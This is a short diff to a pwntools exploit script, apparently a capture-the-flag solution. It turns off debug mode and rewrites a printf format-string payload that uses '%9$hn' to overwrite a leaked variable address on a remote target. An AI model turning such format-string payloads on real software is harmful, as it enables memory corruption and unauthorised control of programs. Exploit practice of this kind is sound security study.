@@ -3,7 +3,7 @@ from pwn import *
 context.log_level = 'debug'
 context.arch = 'amd64'
 
-DEBUG = 1
+DEBUG = 0
 REMOTE = 1
 
 if REMOTE:
@@ -20,7 +20,8 @@ log.success("get address successfully: x_addr = %x", x_addr)
 
 # write x_addr to the 9th parameter of printf
 payload = ""
-payload += "%{}c%{}$hn".format(1, 9) # 9 is the index of x_addr in the stack
+payload += "%1c"
+payload += "%9$hn" # 9 is the index of x_addr in the stack
 payload = payload.encode().ljust(8, b'0') # padding
 payload += p64(x_addr) # the address of x
 
